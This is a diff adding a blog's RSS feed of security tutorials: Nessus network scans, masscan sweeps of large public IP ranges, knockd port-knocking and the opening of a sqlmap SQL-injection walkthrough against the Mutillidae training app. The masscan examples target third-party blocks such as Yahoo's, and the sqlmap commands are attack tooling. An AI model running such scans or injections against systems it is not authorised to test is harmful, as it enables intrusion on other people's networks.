@@ -1,0 +1,1348 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Scanning on Technical Notes</title>
+    <link>https://tzyluen.github.io/tags/scanning/index.xml</link>
+    <description>Recent content in Scanning on Technical Notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2015. All rights reserved.</copyright>
+    <atom:link href="https://tzyluen.github.io/tags/scanning/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Scan a network for vulnerability with Nessus</title>
+      <link>https://tzyluen.github.io/post/scan-a-network-for-vulnerability-with-nessus/</link>
+      <pubDate>Fri, 31 Mar 2017 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/scan-a-network-for-vulnerability-with-nessus/</guid>
+      <description>
+
+&lt;h1 id=&#34;scan-a-network&#34;&gt;Scan a network&lt;/h1&gt;
+
+&lt;p&gt;Target: 192.168.1.0/24&lt;/p&gt;
+
+&lt;p&gt;Nessus provides a set of ready-to-use templates. For general scans, the (1) Advanced Scan and (2) Basic Network Scan would work.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-01.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-01&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;advanced-scans&#34;&gt;Advanced Scans&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Navigates to &lt;code&gt;Scans&lt;/code&gt; &amp;rarr; &lt;code&gt;New Scan&lt;/code&gt; &amp;rarr; &lt;code&gt;Advanced Scan&lt;/code&gt;, insert the &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt;, and &lt;code&gt;targets&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-02.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Configure the rest of the settings:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-03.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Once all is set, save and simply launch the scan.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;basic-network-scans&#34;&gt;Basic network scans&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Navigates to &lt;code&gt;Scans&lt;/code&gt; &amp;rarr; &lt;code&gt;New Scan&lt;/code&gt; &amp;rarr; &lt;code&gt;Basic Network Scan&lt;/code&gt;, insert the &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt; and &lt;code&gt;targets&lt;/code&gt;, then save.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-04.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-04&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;From the &lt;code&gt;My Scans&lt;/code&gt; folder, select a task from the list to launch the scan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-05.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Once the scan complete, the status bar will changed to checked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-06.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-06&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;results&#34;&gt;Results&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;The scan results are grouped by host, and vulnerabilities (color-coded by severity).&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;To prepare both summary and technical reports to circulate among teams, use the Export &amp;rarr; PDF (or HTML, CSV, Nessus, Nessus DB)&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Clicking the vulnerabilities bar will drill-down to the next-level of 192.168.1.1 vulnerabilities:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-07.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-07&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The next level of drill-down will display the list of vulnerabilities exposed by Nessus on target 192.168.1.1, and clicking the specific vulnerability will drill-down to the attack vectors info:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-10.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-10&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The description of the vulnerability, the recommended solution, and the payload used during the scan are documented:&lt;/p&gt;
+
+&lt;p&gt;i. Description of the vulnerability and the attack vector.&lt;/p&gt;
+
+&lt;p&gt;ii. The recommended solution.&lt;/p&gt;
+
+&lt;p&gt;iii. The attack code/payload during the scan.&lt;/p&gt;
+
+&lt;p&gt;iv. Network port used for this attack.&lt;/p&gt;
+
+&lt;p&gt;v. A summarize of the risk factor information.&lt;/p&gt;
+
+&lt;p&gt;vi. Vulnerability information on known exploit availability and publication date.&lt;/p&gt;
+
+&lt;p&gt;vii. Reference information from the CVE (Common Vulnerabilities and Exposures) network.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-11.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-11&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;exports&#34;&gt;Exports&lt;/h2&gt;
+
+&lt;h3 id=&#34;executive-report&#34;&gt;Executive Report&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;To generate an executive report, choose:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-08.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-08&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;technical-report&#34;&gt;Technical Report&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;To generate a technical report, choose &lt;code&gt;Custom&lt;/code&gt;, select &lt;code&gt;Vulnerabilities&lt;/code&gt; to include the data, and group by &lt;code&gt;Host&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-a-network-for-vulnerability-with-nessus-09.png&#34; alt=&#34;scan-a-network-for-vulnerability-with-nessus-09&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&#34;https://www.tenable.com/products/nessus-vulnerability-scanner&#34;&gt;https://www.tenable.com/products/nessus-vulnerability-scanner&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Scan the Internet with masscan</title>
+      <link>https://tzyluen.github.io/post/scan-the-internet-with-masscan/</link>
+      <pubDate>Fri, 17 Mar 2017 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/scan-the-internet-with-masscan/</guid>
+      <description>
+
+&lt;p&gt;Base system used to perform the scans:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.11:~# uname -a
+Linux kali 4.9.0-kali3-amd64 #1 SMP Debian 4.9.13-1kali2 (2017-03-07) x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;scan-large-ip-block&#34;&gt;Scan large IP block&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Scan the entire 175.0.0.0/8 for port 22, 80, 445&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-00.png&#34; alt=&#34;scan-the-internet-with-masscan-00&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; It&amp;rsquo;s risky to perform such as scan as it may trigger some IDS/IPS and get your IP blocked/blacklisted from accessing them permanently.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Scan a Yahoo IP block for port tcp/80:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Trace the Yahoo&amp;rsquo;s IP block:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@192.168.1.11:~# mtr -y1 yahoo.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-01.png&#34; alt=&#34;scan-the-internet-with-masscan-01&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Scan the entire IP block (32768 of hosts):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-02.png&#34; alt=&#34;scan-the-internet-with-masscan-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;exclude-ip-blocks-of-sensitive-part-of-the-internet&#34;&gt;Exclude IP blocks of sensitive part of the Internet:&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Ensure the &lt;code&gt;excludefile&lt;/code&gt; is defined in &lt;code&gt;/etc/masscan/masscan.conf&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;excludefile=/etc/masscan/exclude.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Append the following into the exclude list to prevent scanning them by accident:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-03.png&#34; alt=&#34;scan-the-internet-with-masscan-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Or, for a non-persistent exclude list, use &lt;code&gt;--excludefile&lt;/code&gt; option:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 175.0.0.0/8 -p80 --rate 10000 --excludefile exclude.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;include-ip-blocks-for-targeted-ip-blocks&#34;&gt;Include IP blocks for targeted IP blocks:&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Similar to &lt;code&gt;excludefile&lt;/code&gt;, the file format for the include list:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Include list:
+# For targeting organizations or verticals with multiple blocks
+75.0.0.0/8               # AT&amp;amp; Internet Services
+175.145.0.0/16           # TMNet
+    
+# Private IPv4 addresses, to scan entire organization network
+192.168.0.0/16           # class C
+172.16.0.0/12            # class B
+10.0.0.0/8               # class A
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Scan with the include file option:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan -p80 --includefile include.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;transmission-rates&#34;&gt;Transmission Rates&lt;/h1&gt;
+
+&lt;p&gt;Depends on network infrastructure and NIC, it can be scaled up to 25 million packets/second.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;The default transmit rate is 100 packets/second. Takes approx. 6 minutes to scan 32768 hosts on port tcp/80:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 98.139.128.0/17 -p80 --rate 100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-04.png&#34; alt=&#34;scan-the-internet-with-masscan-04&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;With 10,000 packets/second takes approx. 8 seconds to scan 32768 hosts on port tcp/80:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 98.139.128.0/17 -p80 --rate 10000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-05.png&#34; alt=&#34;scan-the-internet-with-masscan-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Known max. transmission rates are:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Windows - 250,000 packets/second&lt;/li&gt;
+&lt;li&gt;Linux - 2,500,000 packets/second&lt;/li&gt;
+&lt;li&gt;PF_RING driver - 25,000,000 packets/second&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;specify-ports-and-ranges&#34;&gt;Specify ports and ranges&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 175.145.0.0/16 -p22,80,445 --rate 1000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-06.png&#34; alt=&#34;scan-the-internet-with-masscan-06&#34; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;banners&#34;&gt;Banners&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Grab the banners, i.e., HTTP server version, title, and etc.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 175.145.0.0/16 -p22,80,445 --rate 10000 --banners
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Some interesting information:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-08.png&#34; alt=&#34;scan-the-internet-with-masscan-08&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;output-formats&#34;&gt;Output formats&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Sets the output format to binary &lt;code&gt;-oB&lt;/code&gt; and saves the output in the given filename, which can be read with &lt;code&gt;--readscan&lt;/code&gt;, and optionally output into a new format later:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-oB: binary
+-oL: list
+-oG: grepable
+-oX: xml
+
+masscan 175.145.0.0/16 -p22,80,445 --banners --rate 10000 -oB 175-145-0-0-masscan.bin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/scan-the-internet-with-masscan-07.png&#34; alt=&#34;scan-the-internet-with-masscan-07&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Read the saved binary file into new &lt;code&gt;xml&lt;/code&gt; format file that can be used for parsing and reporting:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 175.145.0.0/16 --readscan 175-145-0-0-masscan.bin -oX 175-145-0-0-masscan.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;save-amp-manage-the-conf-for-different-scanning-strategies-amp-objectives&#34;&gt;Save &amp;amp; manage the conf for different scanning strategies &amp;amp; objectives&lt;/h1&gt;
+
+&lt;p&gt;Save the configuration into a file. Multiple conf files for different objectives and strategies. For example, a configuration file for a particular ip block, i.e.,&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Save the current settings into a conf file (&lt;code&gt;--echo&lt;/code&gt; and redirect to &lt;code&gt;175-145-0-0.conf&lt;/code&gt;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan 175.145.0.0/16 -p22,80,445 --banners --rate 10000 --echo &amp;gt; 175-145-0-0.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Use the saved profile for the same objective:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;masscan -c 175-145-0-0.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Port-knocking</title>
+      <link>https://tzyluen.github.io/post/port-knocking/</link>
+      <pubDate>Sat, 03 Sep 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/port-knocking/</guid>
+      <description>
+
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Port-knocking is a stealth method to open ports that the firewall keeps closed by default. A port-knock server listens to all traffic on an ethernet (or PPP) interface, looking for a special &amp;ldquo;knock&amp;rdquo; sequences of port-hits.&lt;/p&gt;
+
+&lt;p&gt;A client system makes these port-hits by sending a TCP (or UDP) packet to a port on the server. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access. The primary benefit is that it suppresses the regular port scan and appears as not availale.&lt;/p&gt;
+
+&lt;p&gt;Essentially, the port-knocking strategy is security by obscurity.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;enabling-knockd&#34;&gt;Enabling knockd&lt;/h1&gt;
+
+&lt;p&gt;A prerequisite to enable port-knocking is &lt;code&gt;iptables&lt;/code&gt;. The &lt;code&gt;knockd&lt;/code&gt; is a small port-knock daemon that implements the port-knock server, dynamically manipulate the firewall rules to open and close ports.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Install:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.9:~$ sudo apt-get install knockd
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Set the default configuration, enable the service at init and set the target network interface:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.9:~$ sudo vim /etc/default/knockd
+...
+START_KNOCKD=1
+KNOCKD_OPTS=&amp;quot;-i enp0s3&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Set the desired port-knocking sequence &lt;code&gt;1300&lt;/code&gt;, &lt;code&gt;8888&lt;/code&gt;, &lt;code&gt;9394&lt;/code&gt; in &lt;code&gt;/etc/knockd.conf&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[options]
+        #UseSyslog
+        logfile     = /var/log/knockd.log
+
+[openSSH]
+        #sequence    = 1300:tcp,8888:udp,9394:tcp
+        sequence    = 1300,8888,9394
+        seq_timeout = 10
+        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+
+[closeSSH]
+        sequence    = 9394,8888,1300
+        seq_timeout = 10
+        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Start the service:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.9:~$ sudo systemctl start knockd
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;port-knocking&#34;&gt;Port-knocking&lt;/h1&gt;
+
+&lt;h2 id=&#34;using-knock&#34;&gt;Using Knock&lt;/h2&gt;
+
+&lt;p&gt;The utility from the &lt;code&gt;knockd&lt;/code&gt; package.&lt;/p&gt;
+
+&lt;h3 id=&#34;open-the-port&#34;&gt;Open the port&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.11:~$ knock -v 192.168.1.9 1300 8888 9394
+hitting tcp 192.168.1.9:1300
+hitting tcp 192.168.1.9:8888
+hitting tcp 192.168.1.9:9394
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; it&amp;rsquo;s possible to combine TCP and UDP port:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.11:~$ knock -v 192.168.1.9 1300:tcp 8888:udp 9394:tcp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;close-the-port&#34;&gt;Close the port&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.11:~$ knock -v 192.168.1.9 9394 8888 1300
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;using-hping3-nmap&#34;&gt;Using Hping3 / Nmap&lt;/h2&gt;
+
+&lt;p&gt;The following comes handy for any remote system to makes port-hits without install the &lt;code&gt;knockd&lt;/code&gt; package.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-S: set SYN tcp flag
+-p: port
+-c: count, stop after sending (and receiving) count response packets
+hping3 -S -p $ARG -c 1 $HOST
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A simple shell script &lt;code&gt;port-knocking.sh&lt;/code&gt; to knocks target host &lt;code&gt;$HOST&lt;/code&gt; of &lt;code&gt;$@&lt;/code&gt; (list of sequences) iteratively.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
+HOST=$1
+shift
+for ARG in &amp;quot;$@&amp;quot;
+do
+    hping3 -S -p $ARG -c 1 $HOST
+    #nmap -Pn --host-timeout 100 --max-retries 0 -p $ARG $HOST
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;open-the-port-1&#34;&gt;Open the port&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Initial state - 192.168.1.9 port 22/tcp closed:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/port-knocking-01.png&#34; alt=&#34;port-knocking-01&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Connection timed out:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/port-knocking-02.png&#34; alt=&#34;port-knocking-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Knocks and opens 192.168.1.9:22 with SYN tcpflag and port 1300, 8888, 9394 sequence:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/port-knocking-03.png&#34; alt=&#34;port-knocking-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Connects to the host:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/port-knocking-05.png&#34; alt=&#34;port-knocking-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The &lt;code&gt;/var/log/knockd.log&lt;/code&gt; entries:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;...
+[2016-09-03 18:20] 192.168.1.11: openSSH: Stage 1
+[2016-09-03 18:20] 192.168.1.11: openSSH: Stage 2
+[2016-09-03 18:20] 192.168.1.11: openSSH: Stage 3
+[2016-09-03 18:20] 192.168.1.11: openSSH: OPEN SESAME
+[2016-09-03 18:20] openSSH: running command: /sbin/iptables -A INPUT -s 192.168.1.11 -p tcp --dport 22 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;close-the-port-1&#34;&gt;Close the port&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Runs the &lt;code&gt;port-knocking.sh&lt;/code&gt; script and pass the close port sequence 9394, 8888, 1300:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/port-knocking-04.png&#34; alt=&#34;port-knocking-04&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The &lt;code&gt;/var/log/knockd.log&lt;/code&gt; entries:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;...
+[2016-09-03 19:37] 192.168.1.11: closeSSH: Stage 1
+[2016-09-03 19:37] 192.168.1.11: closeSSH: Stage 2
+[2016-09-03 19:37] 192.168.1.11: closeSSH: Stage 3
+[2016-09-03 19:37] 192.168.1.11: closeSSH: OPEN SESAME
+[2016-09-03 19:37] closeSSH: running command: /sbin/iptables -D INPUT -s 192.168.1.11 -p tcp --dport 22 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;alternative&#34;&gt;Alternative&lt;/h1&gt;
+
+&lt;p&gt;There are a lot of existing implementations available to support various platforms [1].
+For instance, a more advanced &lt;code&gt;fwknop&lt;/code&gt; [2] which implements an authorization scheme known as Single Packet Authorization (SPA) for strong service concealment.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&#34;http://www.portknocking.org/view/implementations&#34;&gt;http://www.portknocking.org/view/implementations&lt;/a&gt; &lt;br&gt;
+[2] &lt;a href=&#34;https://github.com/mrash/fwknop&#34;&gt;https://github.com/mrash/fwknop&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>SQL injection with sqlmap</title>
+      <link>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</link>
+      <pubDate>Sat, 07 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</guid>
+      <description>
+
+&lt;h1 id=&#34;scan-for-vulnerability&#34;&gt;Scan for vulnerability&lt;/h1&gt;
+
+&lt;h2 id=&#34;create-a-http-request-file&#34;&gt;Create a HTTP request file&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Use &lt;code&gt;-r&lt;/code&gt; option instead of passing long parameters of &lt;code&gt;--url&lt;/code&gt;, &lt;code&gt;--user-agent&lt;/code&gt;, etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; use packet capture utility such as &lt;code&gt;ngrep&lt;/code&gt; to facilitate the process.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sqlmap -r REQUESTFILE ...
+-r REQUESTFILE      Load HTTP request from a file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-01.png&#34; alt=&#34;sql-injection-with-sqlmap-01&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Clean-up the trailing &lt;code&gt;.&lt;/code&gt; (non-printable char displayed by &lt;code&gt;ngrep&lt;/code&gt;), and write to a file e.g., &lt;code&gt;mutillidae-login.request&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-02.png&#34; alt=&#34;sql-injection-with-sqlmap-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;scan-the-target&#34;&gt;Scan the target&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Launch the scan with the &lt;code&gt;-r&lt;/code&gt; and use the request file created above, it will take some time:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r -mutillidae-login.request --batch --banner
+&lt;/code&gt;&lt;/pre&gt;
+
